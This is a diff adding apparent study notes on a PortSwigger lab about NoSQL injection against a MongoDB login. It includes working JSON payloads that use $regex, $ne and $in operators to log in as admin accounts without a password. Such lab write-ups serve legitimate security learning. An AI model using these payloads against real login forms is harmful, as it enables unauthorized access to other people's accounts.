@@ -90,3 +90,29 @@ For URL-based inputs, you can insert query operators via URL parameters. For exa
 To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example:
 
 `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`
+
+----
+[lab](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication)
+this website have login and it use `mongoDB` language and it vulnerable to injection , it have this json
+```json
+{
+	"username":"wiener",
+	"password":"peter"
+}
+```
+
+it can use `noSQL` injection operation like **`$ne`,`$in` ,`$where`,`$regex`** to login in without need to have password , like this 
+```json
+{
+	"username":{
+		"$regex":"admin.*"
+	},
+	"password":{
+		"$ne":""
+	}
+}
+```
+which mean login using any username that start with **`admin`** and any password that don't equal to `""` which mean empty space by this you will able to login to any account
+
+___
+	
